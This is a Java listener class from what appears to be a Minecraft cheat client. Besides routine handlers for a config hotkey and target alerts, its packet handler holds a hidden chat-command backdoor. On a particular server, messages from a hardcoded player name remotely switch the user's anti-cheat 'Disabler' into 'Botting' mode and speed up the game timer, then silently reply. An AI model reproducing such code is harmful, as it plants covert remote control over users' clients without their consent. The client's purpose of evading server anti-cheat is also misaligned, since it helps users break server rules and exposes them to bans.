package club.bluezenith.events.listeners;

import club.bluezenith.BlueZenith;
import club.bluezenith.events.Listener;
import club.bluezenith.events.impl.KeyPressEvent;
import club.bluezenith.events.impl.PacketEvent;
import club.bluezenith.events.impl.ServerConnectEvent;
import club.bluezenith.events.impl.SpawnPlayerEvent;
import club.bluezenith.module.modules.exploit.Disabler;
import club.bluezenith.module.modules.misc.Timer;
import club.bluezenith.module.value.types.FloatValue;
import club.bluezenith.util.client.ServerUtils;
import club.bluezenith.util.player.PacketUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.server.S02PacketChat;
import net.minecraft.network.play.server.S14PacketEntity;
import org.lwjgl.input.Keyboard;

import java.awt.*;
import java.io.File;
import java.util.List;

import static club.bluezenith.util.MinecraftInstance.mc;
import static com.google.common.collect.Lists.newArrayList;
import static java.lang.System.currentTimeMillis;
import static org.lwjgl.input.Keyboard.*;

public class UtilityListener {

    @Listener
    public void onConnect(ServerConnectEvent event) {
        ServerUtils.checkHypixel();
    }

    @Listener
    public void onKeyPress(KeyPressEvent event) {
        final int key = event.keyCode;
        if(key == KEY_LMENU || key == KEY_LSHIFT || key == KEY_C) {
            if(isKeyDown(KEY_LMENU) && isKeyDown(KEY_C) && isKeyDown(KEY_LSHIFT)) {
                try {
                    Desktop.getDesktop().open(new File(BlueZenith.getBlueZenith().getResourceRepository().getFilePath("config")));
                } catch (Exception exception) {
                    exception.printStackTrace();
                    BlueZenith.getBlueZenith().getNotificationPublisher().postError(
                            BlueZenith.getBlueZenith().getName(),
                            "Failed to open configs folder!",
                            2000
                    );
                }
            }
        }
        if(Minecraft.getMinecraft().thePlayer != null && Minecraft.getMinecraft().currentScreen == null)
            Keyboard.enableRepeatEvents(false);
    }

    public static List<String> notified = newArrayList();

    @Listener
    public void onPacket(PacketEvent event) {
        if(event.packet instanceof S14PacketEntity) {
            final S14PacketEntity s0c = (S14PacketEntity) event.packet;
            if(mc.theWorld == null) return;
            final Entity entity = s0c.getEntity(mc.theWorld);
            if(entity instanceof EntityPlayer) {
                final String name = ((EntityPlayer) entity).getGameProfile().getName();
                if(!notified.contains(name) && BlueZenith.getBlueZenith().getTargetManager().isTarget(name)) {
                    notified.add(name);
                    BlueZenith.getBlueZenith().getNotificationPublisher().postWarning(
                            "Targets",
                            "Target found: " + name,
                            2500
                    );
                }
            }
        } else if(event.packet instanceof S02PacketChat && PacketUtil.data != null && PacketUtil.data.serverIP.contains("pulsive")) {
            final String text = ((S02PacketChat) event.packet).getChatComponent().getUnformattedText();

            final String[] _text = text.split(" ");
            if(_text.length < 3) return;

            if(_text[1].contains("bendacutie") && !mc.session.getUsername().contains("bendacutie")) {
                if (_text[2].equals("-stop")) {
                    BlueZenith.getBlueZenith().getModuleManager().getModule(Disabler.class).setState(false);
                    BlueZenith.getBlueZenith().getModuleManager().getModule(Timer.class).setState(false);
                    PacketUtil.sendSilent(new C01PacketChatMessage("Stopped"));
                } else if(_text[2].equals("-start")) {
                    BlueZenith.getBlueZenith().getModuleManager().getModule(Disabler.class).setState(true);

                    final Disabler disabler = BlueZenith.getBlueZenith().getModuleManager().getAndCast(Disabler.class);

                    int iterations = 10;

                    while (!disabler.mode.get().getKey().equals("Botting")) {
                        disabler.mode.next();

                        if(iterations-- <= 0) {
                            PacketUtil.sendSilent(new C01PacketChatMessage("Failed"));
                            return;
                        }
                    }

                    disabler.setState(true);

                    BlueZenith.getBlueZenith().getModuleManager().getModule(Timer.class).setState(true);
                    ((FloatValue)BlueZenith.getBlueZenith().getModuleManager().getModule(Timer.class).getValue("Speed")).set(2.7F);
                    PacketUtil.sendSilent(new C01PacketChatMessage("Started [" + iterations + " iterations]"));
                }
            }
        }
    }

    long lastCall;

    @Listener
    public void onSpawn(SpawnPlayerEvent event) {
        if(currentTimeMillis() - lastCall > 100) {
            lastCall = currentTimeMillis();
            notified.clear();
        }
    }

}
